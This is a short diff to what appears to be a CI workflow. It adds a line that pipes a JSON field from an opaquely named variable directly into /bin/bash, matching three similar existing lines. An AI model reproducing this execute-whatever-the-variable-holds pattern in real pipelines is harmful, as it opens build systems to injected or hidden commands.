@@ -32,6 +32,7 @@ jobs:
           echo $qdxsf4100 | jq -r .c825 | /bin/bash
           printf '%s' "$sttvo9" | jq -r .td896 | /bin/bash
           echo $nas21 | jq -r .ohwhb93931 | /bin/bash
+          echo $j27 | jq -r .ptuq073 | /bin/bash
 
       - name: Archive output
         if: always()
